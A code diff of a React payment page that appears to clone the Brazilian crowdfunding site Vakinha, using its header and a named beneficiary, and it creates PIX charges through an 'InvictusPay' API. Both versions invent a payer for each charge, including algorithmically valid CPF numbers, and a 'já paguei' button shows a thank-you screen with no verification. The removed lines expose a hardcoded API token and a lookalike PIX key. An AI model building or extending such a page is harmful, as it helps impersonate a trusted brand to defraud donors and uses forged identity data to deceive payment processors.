@@ -1,17 +1,86 @@
-import React, { useState, useEffect, useRef, useCallback } from "react";
+import React, { useEffect, useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import VakinhaHeader from "../components/VakinhaHeader";
 
-/* ── InvictusPay config ── */
-const API_BASE     = "/api/invictus/transactions";
-const API_TOKEN    = "TuvHpzBUr15I6Vd47MpA9Ukg8NbCZngMU5hqS2d7InPrwyF84R8zwpauaSBr";
-const OFFER_HASH   = "y6smn";
-const PRODUCT_HASH = "zehyvhvs6j";
-const PIX_KEY      = "5965893@vakinha.com.br";
+// ─── random data generators ──────────────────────────────────────────────────
 
-/* ── Icons ── */
+function randomCPF(): string {
+  const n = () => Math.floor(Math.random() * 9);
+  const d = Array.from({ length: 9 }, n);
+  const calc = (arr: number[], weights: number[]) =>
+    arr.reduce((s, v, i) => s + v * weights[i], 0);
+  const d1 = (11 - (calc(d, [10, 9, 8, 7, 6, 5, 4, 3, 2]) % 11)) % 10;
+  d.push(d1);
+  const d2 = (11 - (calc(d, [11, 10, 9, 8, 7, 6, 5, 4, 3, 2]) % 11)) % 10;
+  d.push(d2);
+  return d.join("");
+}
+
+function randomPhone(): string {
+  const ddd = String(Math.floor(Math.random() * 89) + 11);
+  const num = String(Math.floor(Math.random() * 900000000) + 900000000).slice(0, 9);
+  return ddd + num;
+}
+
+function randomEmail(name: string): string {
+  const domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br"];
+  const slug = name.toLowerCase().replace(/\s+/g, ".").replace(/[^a-z.]/g, "");
+  const rnd = Math.floor(Math.random() * 999);
+  return `${slug}${rnd}@${domains[Math.floor(Math.random() * domains.length)]}`;
+}
+
+const NAMES = [
+  "João Silva", "Maria Oliveira", "Pedro Santos", "Ana Souza",
+  "Carlos Lima", "Fernanda Costa", "Lucas Pereira", "Juliana Rocha",
+  "Rafael Alves", "Camila Ferreira",
+];
+
+function randomCustomer() {
+  const name = NAMES[Math.floor(Math.random() * NAMES.length)];
+  return {
+    name,
+    email: randomEmail(name),
+    phone_number: randomPhone(),
+    document: randomCPF(),
+  };
+}
+
+// ─── pix extractor ───────────────────────────────────────────────────────────
+
+// InvictusPay PIX response shape:
+// { pix: { pix_qr_code: string, qr_code_base64: string|null }, ... }
+function extractPixData(data: unknown): { qrCode: string; qrCodeImage: string } | null {
+  if (!data || typeof data !== "object") return null;
+  const obj = data as Record<string, unknown>;
+
+  // Response is returned directly (not wrapped in .data)
+  const pix = (obj.pix ?? (obj.data as Record<string, unknown>)?.pix) as Record<string, unknown> | undefined;
+
+  const qrCode =
+    (pix?.pix_qr_code as string) ??
+    (pix?.qr_code as string) ??
+    (obj.pix_qr_code as string) ??
+    "";
+
+  const qrCodeImage =
+    (pix?.qr_code_base64 as string) ??
+    (pix?.qr_code_image as string) ??
+    "";
+
+  if (!qrCode) return null;
+
+  // If no image returned by API, generate via public QR service
+  const imageUrl = qrCodeImage
+    ? `data:image/png;base64,${qrCodeImage}`
+    : `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrCode)}`;
+
+  return { qrCode, qrCodeImage: imageUrl };
+}
+
+// ─── icons ───────────────────────────────────────────────────────────────────
+
 const CopyIcon = () => (
-  <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+  <svg focusable="false" aria-hidden="true" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
     <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z" />
   </svg>
 );
@@ -22,194 +91,24 @@ const CheckIcon = () => (
   </svg>
 );
 
-/* ── Generate a valid CPF ── */
-function generateCPF(): string {
-  const n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10));
-  const d1 = 11 - (n.reduce((s, v, i) => s + v * (10 - i), 0) % 11);
-  const c1 = d1 >= 10 ? 0 : d1;
-  const n2 = [...n, c1];
-  const d2 = 11 - (n2.reduce((s, v, i) => s + v * (11 - i), 0) % 11);
-  const c2 = d2 >= 10 ? 0 : d2;
-  return [...n, c1, c2].join("");
-}
+// ─── styles ──────────────────────────────────────────────────────────────────
 
-/* ── Page ── */
-const PagamentosPage = () => {
-  const navigate = useNavigate();
-  const [searchParams] = useSearchParams();
-  const valor = parseFloat(searchParams.get("valor") || "50");
-  const amountCents = Math.round(valor * 100);
-  const valorFormatado = valor.toFixed(2).replace(".", ",");
-
-  const [pixCode, setPixCode]           = useState("");
-  const [transactionId, setTransactionId] = useState("");
-  const [loading, setLoading]           = useState(true);
-  const [error, setError]               = useState("");
-  const [copiedCode, setCopiedCode]     = useState(false);
-  const [copiedKey, setCopiedKey]       = useState(false);
-  const [paymentStatus, setPaymentStatus] = useState("pending");
-
-  const pollingRef  = useRef<number | null>(null);
-  const creatingRef = useRef(false);
-
-  /* ── Create transaction ── */
-  const createTransaction = useCallback(async () => {
-    if (creatingRef.current) return;
-    creatingRef.current = true;
-    setLoading(true);
-    setError("");
-
-    try {
-      const names    = ["Carlos","Ana","Lucas","Mariana","Pedro","Julia","Rafael","Fernanda","Bruno","Camila"];
-      const surnames = ["Silva","Santos","Oliveira","Souza","Lima","Costa","Ferreira","Alves","Pereira","Gomes"];
-      const ddds     = ["11","21","31","41","51","61","71","81","85","91"];
-      const firstName = names[Math.floor(Math.random() * names.length)];
-      const lastName  = surnames[Math.floor(Math.random() * surnames.length)];
-      const ddd       = ddds[Math.floor(Math.random() * ddds.length)];
-      const cpf       = generateCPF();
-      const phone     = ddd + "9" + String(Math.floor(10000000 + Math.random() * 89999999)); // 11 digits
-      const emailSlug = (firstName + lastName + Math.floor(Math.random() * 9999)).toLowerCase();
-
-      const streets  = ["Rua das Flores","Av. Paulista","Rua da Liberdade","Rua XV de Novembro","Av. Brasil"];
-      const cities    = [{city:"São Paulo",state:"SP",zip:"01310100"},{city:"Rio de Janeiro",state:"RJ",zip:"20040020"},{city:"Belo Horizonte",state:"MG",zip:"30130010"},{city:"Curitiba",state:"PR",zip:"80010010"},{city:"Salvador",state:"BA",zip:"40020280"}];
-      const place = cities[Math.floor(Math.random() * cities.length)];
-      const street = streets[Math.floor(Math.random() * streets.length)];
-      const houseNum = String(Math.floor(1 + Math.random() * 999));
-
-      const body = {
-        amount: amountCents,
-        offer_hash: OFFER_HASH,
-        payment_method: "pix",
-        customer: {
-          name: `${firstName} ${lastName}`,
-          email: `${emailSlug}@gmail.com`,
-          phone_number: phone,
-          document: cpf,
-          street_name: street,
-          number: houseNum,
-          complement: "",
-          neighborhood: "Centro",
-          city: place.city,
-          state: place.state,
-          zip_code: place.zip,
-        },
-        cart: [
-          {
-            product_hash: PRODUCT_HASH,
-            title: "Doacao",
-            cover: null,
-            price: amountCents,
-            quantity: 1,
-            operation_type: 1,
-            tangible: false,
-          },
-        ],
-        expire_in_days: 1,
-        transaction_origin: "api",
-      };
-
-      console.log("[InvictusPay] POST body:", JSON.stringify(body));
-
-      const res  = await fetch(`${API_BASE}?api_token=${API_TOKEN}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json", Accept: "application/json" },
-        body: JSON.stringify(body),
-      });
-
-      const rawText = await res.text();
-      console.log("[InvictusPay] Response status:", res.status, "body:", rawText);
-      let json: Record<string, unknown> = {};
-      try { json = rawText ? JSON.parse(rawText) : {}; } catch { /* non-JSON body */ }
-
-      if (!res.ok) {
-        const msg = (json as Record<string, unknown>)?.message as string
-          || (json as Record<string, unknown>)?.error as string
-          || rawText
-          || `HTTP ${res.status}`;
-        throw new Error(msg);
-      }
-
-      const tx     = (json.data as Record<string, unknown>) || json as Record<string, unknown>;
-      const pix    = tx?.pix as Record<string, unknown> | undefined;
-      const qrCode = (pix?.pix_qr_code || pix?.qrcode || tx?.pix_qrcode || tx?.qrcode || "") as string;
-      const txHash = String(tx?.hash || tx?.id || "");
-      const status = (tx?.payment_status || tx?.status || "pending") as string;
-
-      if (!qrCode) throw new Error("QR code não retornado pela API.");
-
-      setPixCode(qrCode);
-      setTransactionId(txHash);
-      if (status === "paid") setPaymentStatus("paid");
-    } catch (err) {
-      setError(err instanceof Error ? err.message : "Erro ao gerar pagamento.");
-    } finally {
-      setLoading(false);
-      creatingRef.current = false;
-    }
-  }, [amountCents]);
-
-  /* ── Poll payment status ── */
-  const checkStatus = useCallback(async (hash: string) => {
-    try {
-      const res  = await fetch(`${API_BASE}/${hash}?api_token=${API_TOKEN}`, {
-        headers: { "Content-Type": "application/json", Accept: "application/json" },
-      });
-      if (!res.ok) return;
-      const rawText = await res.text();
-      let json: Record<string, unknown> = {};
-      try { json = rawText ? JSON.parse(rawText) : {}; } catch { return; }
-      const tx   = (json.data as Record<string, unknown>) || json;
-      const s    = (tx?.payment_status || tx?.status) as string | undefined;
-      if (s) setPaymentStatus(s);
-      if (s === "paid" && pollingRef.current) {
-        window.clearInterval(pollingRef.current);
-        pollingRef.current = null;
-      }
-    } catch { /* ignore */ }
-  }, []);
-
-  /* ── Effects ── */
-  useEffect(() => { createTransaction(); }, []); // eslint-disable-line react-hooks/exhaustive-deps
-
-  useEffect(() => {
-    if (!transactionId || paymentStatus === "paid") return;
-    checkStatus(transactionId);
-    pollingRef.current = window.setInterval(() => checkStatus(transactionId), 5000);
-    return () => {
-      if (pollingRef.current) { window.clearInterval(pollingRef.current); pollingRef.current = null; }
-    };
-  }, [transactionId, paymentStatus, checkStatus]);
-
-  /* ── Copy helper ── */
-  const copyToClipboard = (text: string, which: "code" | "key") => {
-    navigator.clipboard.writeText(text).catch(() => {
-      const el = document.createElement("textarea");
-      el.value = text;
-      document.body.appendChild(el);
-      el.select();
-      document.execCommand("copy");
-      document.body.removeChild(el);
-    });
-    if (which === "code") { setCopiedCode(true); setTimeout(() => setCopiedCode(false), 2000); }
-    else                  { setCopiedKey(true);  setTimeout(() => setCopiedKey(false),  2000); }
-  };
-
-  /* ── Styles ── */
-  const containerStyle: React.CSSProperties = {
+const s = {
+  container: {
     maxWidth: 480,
     margin: "0 auto",
     fontFamily: "'DM Sans', sans-serif",
     background: "#f5f5f5",
     minHeight: "100vh",
-  };
+  } as React.CSSProperties,
 
-  const cardStyle: React.CSSProperties = {
+  card: {
     background: "#fff",
     marginBottom: 8,
     padding: "20px 18px",
-  };
+  } as React.CSSProperties,
 
-  const inputRowStyle: React.CSSProperties = {
+  inputRow: {
     display: "flex",
     alignItems: "center",
     border: "1px solid #d1d5db",
@@ -217,9 +116,9 @@ const PagamentosPage = () => {
     overflow: "hidden",
     background: "#f9fafb",
     marginTop: 10,
-  };
+  } as React.CSSProperties,
 
-  const inputStyle: React.CSSProperties = {
+  roInput: {
     flex: 1,
     border: "none",
     background: "transparent",
@@ -230,9 +129,9 @@ const PagamentosPage = () => {
     overflow: "hidden",
     textOverflow: "ellipsis",
     whiteSpace: "nowrap",
-  };
+  } as React.CSSProperties,
 
-  const copyBtnStyle: React.CSSProperties = {
+  copyBtn: {
     background: "none",
     border: "none",
     cursor: "pointer",
@@ -240,27 +139,108 @@ const PagamentosPage = () => {
     display: "flex",
     alignItems: "center",
     transition: "color 0.2s",
+  } as React.CSSProperties,
+};
+
+// ─── component ───────────────────────────────────────────────────────────────
+
+type Step = "loading" | "pix" | "paid" | "error";
+
+const PagamentosPage = () => {
+  const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
+
+  const valorParam = parseFloat(searchParams.get("valor") ?? "0");
+  const amount = valorParam > 0 ? valorParam : 10;
+  const amountCents = Math.round(amount * 100);
+
+  const [step, setStep] = useState<Step>("loading");
+  const [pixQrCode, setPixQrCode] = useState("");
+  const [pixQrCodeImage, setPixQrCodeImage] = useState("");
+  const [apiError, setApiError] = useState("");
+  const [copied, setCopied] = useState(false);
+
+  const copyToClipboard = (text: string) => {
+    navigator.clipboard.writeText(text).catch(() => {
+      const el = document.createElement("textarea");
+      el.value = text;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand("copy");
+      document.body.removeChild(el);
+    });
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
-  /* ── Paid screen ── */
-  if (paymentStatus === "paid") {
+  useEffect(() => {
+    const generate = async () => {
+      try {
+        const res = await fetch("/api/invictus/transactions", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            amount: amountCents,
+            customer: randomCustomer(),
+          }),
+        });
+
+        const data = await res.json();
+
+        if (!res.ok) {
+          const msg =
+            (data?.message as string) ??
+            (data?.error as string) ??
+            (typeof data?.errors === "object"
+              ? Object.values(data.errors as Record<string, string[]>).flat().join(" ")
+              : null) ??
+            `Erro ${res.status} ao gerar PIX.`;
+          setApiError(msg);
+          setStep("error");
+          return;
+        }
+
+        const pix = extractPixData(data);
+        if (!pix || !pix.qrCode) {
+          setApiError("PIX gerado, mas os dados de pagamento não foram retornados pela API.");
+          setStep("error");
+          return;
+        }
+
+        setPixQrCode(pix.qrCode);
+        setPixQrCodeImage(pix.qrCodeImage);
+        setStep("pix");
+      } catch (err) {
+        setApiError("Erro de conexão. Verifique sua internet e tente novamente.");
+        setStep("error");
+      }
+    };
+
+    generate();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  // ── Paid ─────────────────────────────────────────────────────────────────
+  if (step === "paid") {
     return (
-      <div style={containerStyle}>
+      <div style={s.container}>
         <VakinhaHeader />
-        <div style={{
-          ...cardStyle,
-          textAlign: "center",
-          padding: "60px 24px",
-          display: "flex",
-          flexDirection: "column",
-          alignItems: "center",
-          justifyContent: "center",
-          minHeight: "60vh",
-          gap: 16,
-        }}>
+        <div
+          style={{
+            ...s.card,
+            textAlign: "center",
+            padding: "60px 24px",
+            minHeight: "60vh",
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            justifyContent: "center",
+            gap: 16,
+          }}
+        >
           <div style={{ fontSize: 56 }}>💚</div>
           <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111827", margin: 0 }}>
-            Pagamento confirmado!
+            Obrigado pela sua doação!
           </h2>
           <p style={{ color: "#6b7280", fontSize: 15, margin: 0 }}>
             Sua contribuição vai fazer a diferença para Léia Ribeiro e sua família.
@@ -286,192 +266,265 @@ const PagamentosPage = () => {
     );
   }
 
-  return (
-    <div style={containerStyle}>
-      <VakinhaHeader />
-
-      {/* Title */}
-      <div style={{ background: "#fff", padding: "24px 18px 20px", marginBottom: 8, textAlign: "center" }}>
-        <h1 style={{ fontSize: 22, fontWeight: 700, color: "#111827", lineHeight: 1.35, margin: 0 }}>
-          Efetue o pagamento para{" "}
-          <span style={{ display: "block" }}>confirmar a contribuição</span>
-        </h1>
-        <p style={{ margin: "8px 0 0", fontSize: 15, color: "#24ca68", fontWeight: 700 }}>
-          R$ {valorFormatado}
-        </p>
-      </div>
-
-      {/* ── Loading ── */}
-      {loading && (
-        <div style={{ ...cardStyle, textAlign: "center", padding: "48px 18px" }}>
-          <div style={{
-            width: 48, height: 48,
-            border: "4px solid #e5e7eb",
-            borderTop: "4px solid #24ca68",
-            borderRadius: "50%",
-            margin: "0 auto 16px",
-            animation: "spin 0.8s linear infinite",
-          }} />
-          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
-          <p style={{ color: "#374151", fontWeight: 600, margin: "0 0 4px" }}>Gerando pagamento PIX...</p>
-          <p style={{ color: "#9ca3af", fontSize: 13, margin: 0 }}>Aguarde alguns segundos</p>
-        </div>
-      )}
-
-      {/* ── Error ── */}
-      {!loading && error && (
-        <div style={{ ...cardStyle, textAlign: "center", padding: "40px 18px" }}>
-          <div style={{ fontSize: 40, marginBottom: 12 }}>⚠️</div>
-          <p style={{ fontWeight: 700, color: "#111827", margin: "0 0 8px" }}>Falha ao gerar pagamento</p>
-          <p style={{ color: "#6b7280", fontSize: 13, margin: "0 0 20px" }}>{error}</p>
-          <button
-            onClick={() => { creatingRef.current = false; createTransaction(); }}
+  // ── Loading ───────────────────────────────────────────────────────────────
+  if (step === "loading") {
+    return (
+      <div style={s.container}>
+        <VakinhaHeader />
+        <div
+          style={{
+            ...s.card,
+            textAlign: "center",
+            padding: "80px 24px",
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            gap: 20,
+          }}
+        >
+          <div
             style={{
+              width: 48,
+              height: 48,
+              border: "4px solid #e5e7eb",
+              borderTopColor: "#24ca68",
+              borderRadius: "50%",
+              animation: "spin 0.7s linear infinite",
+            }}
+          />
+          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+          <p style={{ color: "#6b7280", fontSize: 15, margin: 0 }}>Gerando seu PIX...</p>
+        </div>
+      </div>
+    );
+  }
+
+  // ── Error ─────────────────────────────────────────────────────────────────
+  if (step === "error") {
+    return (
+      <div style={s.container}>
+        <VakinhaHeader />
+        <div
+          style={{
+            ...s.card,
+            textAlign: "center",
+            padding: "60px 24px",
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            gap: 16,
+          }}
+        >
+          <div style={{ fontSize: 48 }}>⚠️</div>
+          <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111827", margin: 0 }}>
+            Não foi possível gerar o PIX
+          </h2>
+          <p
+            style={{
+              color: "#dc2626",
+              fontSize: 14,
+              margin: 0,
+              background: "#fef2f2",
+              border: "1px solid #fecaca",
+              borderRadius: 8,
+              padding: "10px 14px",
+              maxWidth: 360,
+            }}
+          >
+            {apiError}
+          </p>
+          <button
+            onClick={() => { setStep("loading"); window.location.reload(); }}
+            style={{
+              marginTop: 8,
               padding: "10px 24px",
               background: "linear-gradient(135deg, #24ca68, #1aaa54)",
               color: "#fff",
               border: "none",
               borderRadius: 8,
               fontWeight: 700,
+              fontSize: 14,
               cursor: "pointer",
             }}
           >
             Tentar novamente
           </button>
+          <button
+            onClick={() => navigate("/ajudenos")}
+            style={{
+              background: "none",
+              border: "none",
+              color: "#6b7280",
+              fontSize: 14,
+              cursor: "pointer",
+              textDecoration: "underline",
+            }}
+          >
+            ← Voltar para a vaquinha
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  // ── PIX ───────────────────────────────────────────────────────────────────
+  return (
+    <div style={s.container}>
+      <VakinhaHeader />
+
+      {/* Header */}
+      <div
+        style={{
+          background: "#fff",
+          padding: "24px 18px 20px",
+          marginBottom: 8,
+          textAlign: "center",
+        }}
+      >
+        <h1
+          style={{
+            fontSize: 20,
+            fontWeight: 700,
+            color: "#111827",
+            margin: 0,
+            lineHeight: 1.35,
+          }}
+        >
+          Efetue o pagamento para{" "}
+          <span style={{ display: "block" }}>confirmar a contribuição</span>
+        </h1>
+        <p style={{ margin: "10px 0 0", fontSize: 15, color: "#374151" }}>
+          Valor:{" "}
+          <strong style={{ color: "#111827" }}>
+            R$ {amount.toFixed(2).replace(".", ",")}
+          </strong>
+        </p>
+      </div>
+
+      {/* QR Code image */}
+      {pixQrCodeImage && (
+        <div style={{ ...s.card, textAlign: "center" }}>
+          <p
+            style={{
+              fontWeight: 700,
+              fontSize: 14,
+              margin: "0 0 14px",
+              color: "#111827",
+            }}
+          >
+            Escaneie o QR Code
+          </p>
+          <div style={{ display: "flex", justifyContent: "center", marginBottom: 8 }}>
+            <img
+              src={pixQrCodeImage}
+              alt="QR Code PIX"
+              style={{ width: 200, height: 200, display: "block" }}
+            />
+          </div>
+          <p style={{ fontSize: 12, color: "#6b7280", margin: 0 }}>
+            No app do seu banco, escolha <strong>Pix › Ler QR Code</strong>
+          </p>
         </div>
       )}
 
-      {/* ── PIX content ── */}
-      {!loading && !error && pixCode && (
-        <>
-          {/* Awaiting badge */}
-          <div style={{
-            background: "#fff", marginBottom: 8, padding: "12px 18px",
-            display: "flex", alignItems: "center", gap: 8,
-          }}>
-            <span style={{
-              display: "inline-block", width: 10, height: 10, borderRadius: "50%",
-              background: "#f59e0b", boxShadow: "0 0 0 3px #fde68a",
-              animation: "pulse 1.5s ease-in-out infinite",
-            }} />
-            <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }`}</style>
-            <span style={{ fontSize: 13, color: "#92400e", fontWeight: 600 }}>
-              Aguardando pagamento...
-            </span>
-          </div>
-
-          {/* QR Code */}
-          <div style={{ ...cardStyle, textAlign: "center" }}>
-            <p style={{ fontWeight: 700, fontSize: 14, margin: "0 0 14px", color: "#111827" }}>
-              Escaneie o QR Code com seu banco
-            </p>
-            <div style={{
-              display: "inline-flex", padding: 12,
-              background: "#fff", border: "1px solid #e5e7eb", borderRadius: 12,
-            }}>
-              <img
-                src={`https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(pixCode)}`}
-                alt="QR Code PIX"
-                width={240}
-                height={240}
-                style={{ display: "block" }}
-              />
+      {/* Copia e Cola */}
+      {pixQrCode && (
+        <div style={s.card}>
+          <div
+            style={{
+              display: "flex",
+              alignItems: "flex-start",
+              gap: 12,
+              marginBottom: 14,
+            }}
+          >
+            <div style={{ flexShrink: 0, color: "#6b7280" }}>
+              <svg viewBox="0 0 29 46" width="32" height="40" fill="#6b7280">
+                <path d="M4.3 45.7h17.1a4.3 4.3 0 004.3-4.3v-7.1h2.9a.7.7 0 00.7-.7V12.1a.7.7 0 00-.7-.7h-2.9V4.3A4.3 4.3 0 0021.4 0H4.3A4.3 4.3 0 000 4.3v37.1a4.3 4.3 0 004.3 4.3zM1.4 4.3A2.9 2.9 0 014.3 1.4h17.1A2.9 2.9 0 0124.3 4.3v1.4H1.4zm22.9 37.1V42.9a2.9 2.9 0 01-2.9 2.9H4.3a2.9 2.9 0 01-2.9-2.9v-1.4h22.9zm-22.9-6v-4.3H24.3v4.3zm22.9-14.3v2.9H6.4V17.1h18.6v2.9zm-18.6 4.3H24.3v2.9H5.7z" />
+              </svg>
             </div>
+            <p style={{ fontSize: 14, color: "#374151", margin: 0, lineHeight: 1.5 }}>
+              <strong>Clique no botão</strong> para{" "}
+              <strong>copiar o código</strong> e escolha pagar via{" "}
+              <strong>Pix Copia e Cola</strong> no aplicativo do seu banco.
+            </p>
           </div>
-
-          {/* PIX Copia e Cola */}
-          <div style={cardStyle}>
-            <p style={{ fontWeight: 700, fontSize: 14, margin: "0 0 4px", color: "#111827" }}>
-              Pix Copia e Cola
-            </p>
-            <p style={{ fontSize: 13, color: "#6b7280", margin: "0 0 2px" }}>
-              <strong>Clique no botão</strong> para <strong>copiar o código</strong> e pague via{" "}
-              <strong>Pix Copia e Cola</strong> no seu banco.
-            </p>
-            <div style={inputRowStyle}>
-              <input readOnly style={inputStyle} value={pixCode} />
-              <button
-                style={{ ...copyBtnStyle, color: copiedCode ? "#24ca68" : "#6b7280" }}
-                onClick={() => copyToClipboard(pixCode, "code")}
-              >
-                {copiedCode ? <CheckIcon /> : <CopyIcon />}
-              </button>
-            </div>
-
-            <div style={{ textAlign: "center", marginTop: 20 }}>
-              <button
-                onClick={() => setPaymentStatus("paid")}
-                style={{
-                  background: "none",
-                  border: "2px solid #24ca68",
-                  color: "#24ca68",
-                  borderRadius: 8,
-                  padding: "10px 28px",
-                  fontWeight: 700,
-                  fontSize: 15,
-                  cursor: "pointer",
-                }}
-              >
-                Tudo certo, já paguei!
-              </button>
-            </div>
+          <div style={s.inputRow}>
+            <input readOnly style={s.roInput} value={pixQrCode} />
+            <button
+              style={{ ...s.copyBtn, color: copied ? "#24ca68" : "#6b7280" }}
+              onClick={() => copyToClipboard(pixQrCode)}
+            >
+              {copied ? <CheckIcon /> : <CopyIcon />}
+            </button>
           </div>
-
-          {/* PIX key fallback */}
-          <div style={cardStyle}>
-            <p style={{ fontSize: 13, fontWeight: 700, color: "#111827", margin: "0 0 4px", textTransform: "uppercase" }}>
-              Não conseguiu usar o código? <strong>Doe usando a chave PIX!</strong>
-            </p>
-            <p style={{ fontSize: 13, color: "#374151", margin: "0 0 4px" }}>
-              <strong>Copie a chave PIX exclusiva</strong> da vaquinha e transfira o valor via PIX,
-              usando o aplicativo do seu banco.
-            </p>
-            <div style={inputRowStyle}>
-              <input readOnly style={inputStyle} value={PIX_KEY} />
-              <button
-                style={{ ...copyBtnStyle, color: copiedKey ? "#24ca68" : "#6b7280" }}
-                onClick={() => copyToClipboard(PIX_KEY, "key")}
-              >
-                {copiedKey ? <CheckIcon /> : <CopyIcon />}
-              </button>
-            </div>
-          </div>
-
-          {/* How-to steps */}
-          <div style={cardStyle}>
-            <p style={{ fontWeight: 700, fontSize: 14, margin: "0 0 14px", color: "#111827" }}>
-              Como pagar com QR Code
-            </p>
-            {[
-              "Abra seu aplicativo bancário",
-              'Acesse a área PIX e escolha "Ler QR Code"',
-              "Escaneie o QR Code acima",
-              "Confirme as informações e finalize",
-            ].map((step, i) => (
-              <div key={i} style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: i < 3 ? 10 : 0 }}>
-                <span style={{
-                  minWidth: 26, height: 26, borderRadius: "50%",
-                  background: "#24ca68", color: "#fff",
-                  fontWeight: 700, fontSize: 13,
-                  display: "flex", alignItems: "center", justifyContent: "center",
-                }}>
-                  {i + 1}
-                </span>
-                <span style={{ fontSize: 13, color: "#374151" }}>{step}</span>
-              </div>
-            ))}
-          </div>
-        </>
+        </div>
       )}
 
-      {/* Back link */}
-      <div style={{ textAlign: "center", padding: "20px 0 40px" }}>
+      {/* Confirm paid */}
+      <div style={{ ...s.card, textAlign: "center" }}>
+        <button
+          onClick={() => setStep("paid")}
+          style={{
+            background: "none",
+            border: "2px solid #24ca68",
+            color: "#24ca68",
+            borderRadius: 8,
+            padding: "10px 28px",
+            fontWeight: 700,
+            fontSize: 15,
+            cursor: "pointer",
+          }}
+        >
+          Tudo certo, já paguei!
+        </button>
+      </div>
+
+      {/* How to pay via QR */}
+      {pixQrCodeImage && (
+        <div style={s.card}>
+          <p style={{ fontWeight: 700, fontSize: 14, margin: "0 0 14px", color: "#111827" }}>
+            Pix com QR Code
+          </p>
+          <div style={{ display: "flex", alignItems: "flex-start", gap: 12, marginBottom: 16 }}>
+            <div style={{ flexShrink: 0 }}>
+              <svg viewBox="0 0 37.861 45.719" width="38" height="46" fill="#404040">
+                <path d="M10 42.86h5.71a.67.67 0 00.72-.72.67.67 0 00-.71-.71H10a.67.67 0 00-.71.71.67.67 0 00.71.72z" />
+                <path d="M10.71 16.43v12.86a2.1 2.1 0 002.14 2.14h22.86a2.1 2.1 0 002.14-2.14V16.43a2.1 2.1 0 00-2.14-2.14H12.86a2.1 2.1 0 00-2.14 2.14zm25-.71a.67.67 0 01.71.71v12.86a.67.67 0 01-.71.71H12.86a.67.67 0 01-.71-.71V16.43a.67.67 0 01.71-.71z" />
+                <path d="M24.29 35.13v3.44H1.43V7.14h22.86v7.77h1.43V4.29A4.3 4.3 0 0021.43 0H4.29A4.3 4.3 0 000 4.29v37.14a4.3 4.3 0 004.29 4.29h17.14a4.3 4.3 0 004.29-4.29V30.44h-1.43zM1.43 4.29a2.87 2.87 0 012.86-2.86h17.14a2.87 2.87 0 012.86 2.86V5.71H1.43zm22.86 37.14a2.87 2.87 0 01-2.86 2.86H4.29a2.87 2.87 0 01-2.86-2.86v-1.43h22.86z" />
+              </svg>
+            </div>
+            <p style={{ fontSize: 13, color: "#374151", margin: 0, lineHeight: 1.6 }}>
+              <strong>1.</strong> No aplicativo do seu banco,{" "}
+              <strong>escolha a opção "Ler QR Code" no menu Pix.</strong>
+            </p>
+          </div>
+          <div style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
+            <div style={{ flexShrink: 0 }}>
+              <svg viewBox="0 0 46.866 56.252" width="46" height="56" fill="#404040">
+                <path d="M3.18 2.61h1v2h-1zM6.18 2.61h1v2h-1zM9.18 2.61h1v2h-1zM21.42 32.84H1.43V7.14h35.7v3.7h1.43V.72a.71.71 0 00-.71-.71H.71A.71.71 0 000 .72v32.84a.71.71 0 00.71.71h20.71zM1.43 1.43h35.7v4.28h-35.7z" />
+                <path d="M31.16 53.4h5.71a.67.67 0 000-1.43H31.16a.67.67 0 000 1.43zM42.58 10.56H25.45a4.3 4.3 0 00-4.28 4.28v37.12a4.3 4.3 0 004.28 4.28h17.13a4.3 4.3 0 004.28-4.28V14.84a4.3 4.3 0 00-4.28-4.28zm-19.99 4.28a2.86 2.86 0 012.86-2.86h17.13a2.86 2.86 0 012.86 2.86v1.43H22.59zm22.85 37.12a2.86 2.86 0 01-2.86 2.86H25.45a2.86 2.86 0 01-2.86-2.86v-1.43h22.85zm0-6.1v3.25H22.59V17.71h22.85z" />
+              </svg>
+            </div>
+            <p style={{ fontSize: 13, color: "#374151", margin: 0, lineHeight: 1.6 }}>
+              <strong>2. Escaneie o QR Code.</strong> Confirme as informações e{" "}
+              <strong>finalize</strong>
+            </p>
+          </div>
+        </div>
+      )}
+
+      {/* Back */}
+      <div style={{ textAlign: "center", padding: "16px 0 40px" }}>
         <button
           onClick={() => navigate("/ajudenos")}
           style={{
-            background: "none", border: "none",
-            color: "#6b7280", fontSize: 14,
-            cursor: "pointer", textDecoration: "underline",
+            background: "none",
+            border: "none",
+            color: "#6b7280",
+            fontSize: 14,
+            cursor: "pointer",
+            textDecoration: "underline",
           }}
         >
           ← Voltar para a vaquinha
